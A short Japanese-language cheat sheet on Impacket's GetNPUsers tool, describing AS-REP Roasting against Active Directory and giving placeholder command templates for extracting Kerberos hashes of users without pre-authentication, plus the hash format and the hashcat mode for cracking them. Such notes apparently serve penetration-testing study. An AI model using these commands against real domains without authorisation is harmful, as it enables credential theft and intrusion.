# GetNPUsersとは
Impacketに含まれているツールで、AS-REP Roastingを自動で実行することができる。  
AS-REP Roastingとはドメインコントローラーに対して事前認証を必要としないユーザーのTGTの要求をし、パスワードハッシュを抜き出す攻撃。

## コマンド
```bash
impacket-GetNPUsers <ドメイン>/<ユーザー> -no-pass -dc-ip <ターゲット> # AS-REP Roasting
impacket-GetNPUsers <ドメイン>/ -no-pass -usersflie <ユーザーリスト> -dc-ip <ターゲット> # ユーザーリストの名前でAS-REP Roasting
# AS-REP
# $krb5asrep$<暗号化タイプ>$<ユーザー>@<ドメイン>:<ソルト>$<ユーザーのパスワードハッシュで暗号化された情報>
# hashcat -m 18200
```
